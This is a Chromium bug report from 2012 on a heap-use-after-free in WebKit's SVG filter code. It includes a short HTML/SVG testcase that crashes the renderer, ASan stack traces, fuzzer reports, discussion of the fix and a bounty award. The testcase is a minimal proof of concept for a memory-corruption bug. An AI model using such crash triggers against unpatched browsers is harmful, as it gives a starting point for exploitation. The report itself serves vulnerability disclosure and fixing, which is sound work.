# Heap-use-after-free in WebCore::GraphicsContext::restore

| Field | Value |
|-------|-------|
| **Issue ID** | [40057022](https://issues.chromium.org/issues/40057022) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink, Blink>SVG |
| **Reporter** | mi...@gmail.com |
| **Assignee** | sc...@chromium.org |
| **Created** | 2012-04-20 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**

use-after-free in WebCore::GraphicsContext::restore

**VERSION**  

Chrome Version: dev

Chromium 20.0.1108.0 (Developer Build 132776)  

OS Linux  

WebKit 536.8 (@114483)

Operating System: 64bit precise

**REPRODUCTION CASE**

<html>
<head>
<script>
onload = function() {
el6.setAttributeNS('http://www.w3.org/1999/xlink', 'xlink:href', '#el0')
}
</script>
</head>
<body>
<svg id="el0" filter="url(#el2)">
<filter id="el2">
<feImage id="el6">
</feImage>
</filter>
</svg>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: renderer + asan  

Crash State:

==22792== ERROR: AddressSanitizer heap-use-after-free on address 0x7fffed5798ec at pc 0x555559c2055f bp 0x7fffffff0410 sp 0x7fffffff0408  

READ of size 1 at 0x7fffed5798ec thread T0  

#0 0x555559c2055f in WebCore::GraphicsContext::restore() ???:0  

#1 0x55555b779915 in WebCore::RenderSVGRoot::paintReplaced(WebCore::PaintInfo&, WebCore::IntPoint const&) ???:0  

#2 0x55555ae209ab in WebCore::RenderReplaced::paint

0x7fffed5798ec is located 108 bytes inside of 144-byte region [0x7fffed579880,0x7fffed579910)  

freed by thread T0 here:  

#0 0x55555e0faa52 in free ??:0  

#1 0x555559d2f4bf in WebCore::ImageBuffer::~ImageBuffer() ???:0  

#2 0x555559e38a9d in WebCore::FilterEffect::~FilterEffect() ???:0  

#3 0x55555ba5298e in WebCore::FEImage::~FEImage() ???:0  

#4 0x55555b79678e in WebCore::SVGFilterBuilder::~SVGFilterBuilder

## Attachments

- [108144.txt](attachments/108144.txt) (text/x-c; charset=us-ascii, 15.8 KB)
- [108144.html](attachments/108144.html) (text/html; charset=us-ascii, 320 B)

## Timeline

### in...@chromium.org (2012-04-20)

Stephen, this looks like a dup of http://code.google.com/p/chromium/issues/detail?id=121926 or similar stack. Can you please check ?

### in...@chromium.org (2012-04-20)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=38220672

Uploader: inferno@chromium.org

Crash Type: Heap-use-after-free READ 1
Crash Address: 0x7f9b10c6b4ec
Crash State:
  - crash stack -
  WebCore::GraphicsContext::restore
  WebCore::RenderSVGRoot::paintReplaced
  - free stack -
  WebCore::ImageBuffer::~ImageBuffer
  WebCore::FilterEffect::~FilterEffect
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=125849:125919

Minimized Testcase (0.22 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv97FXima8lk0HDTxtkUkrrVi-phd4wCqeMSCgqabct9sIHQRCMH28AazDhHoxK9Y9MoQ0b1T10qUeV7cgLt-ZWF_PHeI0JDq-XPbPdkGRH5qxv8_Q5FvaLm0oI7ZFzQWoWf-UhFCogAsviY9yai9juZa-h8G2Q
<script>
      onload = function() {
        el6.setAttributeNS('http://www.w3.org/1999/xlink', 'xlink:href', '#el0')
      }
    </script>
  <svg id="el0" filter="url(#el2)">
    <filter id="el2">
    <feImage id="el6"</feImage>

### in...@chromium.org (2012-04-20)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-04-20)

SVG crazy regressions! https://bugs.webkit.org/show_bug.cgi?id=84428

### sc...@chromium.org (2012-04-20)

This aint no regression. It a fundamentally bad design of the code handling SVG rendering resources which I am increasingly thinking needs a total rewrite in a way that is not a hack job.

We might have to rewrite it anyway to handle GPU acceleration.

### re...@google.com (2012-04-20)

[Empty comment from Monorail migration]

### sc...@chromium.org (2012-04-20)

Here's what I mean by SVG filters requiring a re-write for GPU acceleration of SVG filtering.

Let's just say we have shader code or otherwise that can perform all of the SVG filtering operations on a texture, and the texture represents the content that needs filtering. We're not actually there yet, but we can get there.

SVG's filtering tags allow almost arbitrary arrangements of filters, everything from the simplest "apply filter to entire SVG content" to "filter this group then use it as an alpha map into another filter the output of which must be composited with the original group rendering". I'm not even touching things like "background image" as the input to a filter.

To accelerate all this, ideally we would break it all down into a directed graph with edges representing content (textures) and nodes representing filter operations. This is all standard stuff if you're building a shading/compositing engine for film or a game. I'm confident we know how to GPU accelerate such a thing.

But right now the SVG code for performing all these operations is nothing like a clean graph construction and traversal process. Any given filter operation may invoke side effects, including things like layout of render tree from DOM elements (my current bette noir). Things like svg "image" tags are particularly problematic because they contain arbitrary content (such as entire SVG files) and may modify things needed by other parts of the filter operation. A structure that we're sending to the GPU must be self contained and cannot call back into CPU code.

Hence, I strongly suspect that a re-write is needed to preprocess everything into the structure we can accelerate. I have no real idea, yet, exactly what the flow would look like. I just know that there must be something better than the status quo.


### sc...@chromium.org (2012-04-20)

[Comment Deleted]

### in...@chromium.org (2012-04-21)

Thanks Stephen for summarizing the problem. Can you please upstream these comments on the webkit bug for http://code.google.com/p/chromium/issues/detail?id=123631. We should see if we can come up with some short-term solution that can disable bad stuff. This bug definitely looks like dup of 123631 which also triggers a use after free in svg filters.

### cl...@chromium.org (2012-05-30)

ClusterFuzz has detected this issue as fixed in range 139300:139395.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=38220672

Uploader: inferno@chromium.org

Crash Type: Heap-use-after-free READ 1
Crash Address: 0x7f9b10c6b4ec
Crash State:
  - crash stack -
  WebCore::GraphicsContext::restore
  WebCore::RenderSVGRoot::paintReplaced
  - free stack -
  WebCore::ImageBuffer::~ImageBuffer
  WebCore::FilterEffect::~FilterEffect
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=125849:125919
Fixed: https://cluster-fuzz.appspot.com/revisions?range=139300:139395

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv97FXima8lk0HDTxtkUkrrVi-phd4wCqeMSCgqabct9sIHQRCMH28AazDhHoxK9Y9MoQ0b1T10qUeV7cgLt-ZWF_PHeI0JDq-XPbPdkGRH5qxv8_Q5FvaLm0oI7ZFzQWoWf-UhFCogAsviY9yai9juZa-h8G2Q

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### in...@chromium.org (2012-05-30)

Stephen, looks like this was not a dup and instead just got fixed from some svg change. Can you please guess from the regression range link what fixed it ?

### sc...@chromium.org (2012-05-30)

This is an example of invalid elements inside an SVG filter element. It was fixed by http://trac.webkit.org/changeset/116647.


### sc...@chromium.org (2012-05-30)

It may also have been this what fixed it: https://trac.webkit.org/changeset/118608/


### sc...@gmail.com (2012-06-06)

Already have 116647 on M20.
Merged 118608 as https://trac.webkit.org/changeset/119627

### sc...@gmail.com (2012-06-22)

$1000

### sc...@gmail.com (2012-06-25)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-07-09)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### js...@chromium.org (2012-12-20)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-14)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/124356?no_tracker_redirect=1

[Multiple monorail components: Blink, Blink>SVG]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40057022)*
